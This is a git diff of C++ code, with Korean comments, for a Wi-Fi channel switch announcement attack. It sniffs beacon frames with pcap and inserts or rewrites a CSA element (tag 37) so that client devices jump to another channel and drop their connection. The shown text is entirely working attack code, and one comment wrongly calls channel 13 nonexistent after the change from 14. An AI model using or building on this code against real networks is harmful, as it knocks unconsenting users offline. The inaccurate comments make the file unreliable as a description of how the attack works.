@@ -47,7 +47,7 @@ int main(int argc, char *argv[]) {
     int count = 0;
     while (true) {
         struct pcap_pkthdr* header;
-        const uint8_t* packet;
+        const uint8_t* packet; // captured packet data pointer
 
         int res = pcap_next_ex(pcap, &header, &packet);
         if (res == 0) continue;   // timeout
@@ -77,17 +77,16 @@ int main(int argc, char *argv[]) {
 
         // FCS 크기 확인 (0 or 4)
         size_t fcs_size = ((RadioTapHdr*)packet)->get_fcs();
-
         // Tagged Parameter 범위 (FCS 제외)
         const uint8_t* tags_start = (const uint8_t*)beacon->first_tag();
         const uint8_t* tags_end_ptr = packet + (int)header->caplen - fcs_size;
 
         
-        // CSA IE: Tag=37, Length=3, [Mode=1, NewChannel=14, Count=1]
+        // CSA IE: Tag=37, Length=3, [Mode=1, NewChannel=13, Count=1]
         // Mode=1: 채널 전환까지 현재 채널 송신 중단
-        // NewChannel=14: 실제로 존재하지 않는 채널 → 연결 해제 유도
+        // NewChannel=13: 실제로 존재하지 않는 채널 → 연결 해제 유도
         // Count=1: 즉시 전환
-        uint8_t csa_ie[] = {37, 3, 1, 14, 1};
+        uint8_t csa_ie[] = {37, 3, 1, 13, 1}; // For new packet don't have CSA Tag
         bool csa_inserted = false;
 
         // Tag Number 기준 정렬 유지하며 CSA IE 삽입
@@ -96,13 +95,11 @@ int main(int argc, char *argv[]) {
         BeaconHdr::Tag* t = (BeaconHdr::Tag*)tags_start;
 
         while ((uint8_t*)t + 2 <= tags_end_ptr) {
-            if (t->number == 37) {
-                // 기존 tag 37: length==3이면 new_ch만 변경하여 복사
+            if (t->number == 37) { // if CSA Tag already exists, modify new_ch value
+                BeaconHdr::csa* csa_ = (BeaconHdr::csa*)t;
                 if (t->length == 3 && (uint8_t*)t + 5 <= tags_end_ptr) {
-                    uint8_t mod[5];
-                    memcpy(mod, (uint8_t*)t, 5);
-                    mod[3] = csa_ie[3]; // new_ch 덮어쓰기
-                    new_tags.insert(new_tags.end(), mod, mod + 5);
+                    csa_->new_ch = (csa_->new_ch <= 7) ? 13 : 1;
+                    new_tags.insert(new_tags.end(), (uint8_t*)csa_, (uint8_t*)csa_ + 5);
                 }
                 csa_inserted = true;
                 t = t->next();
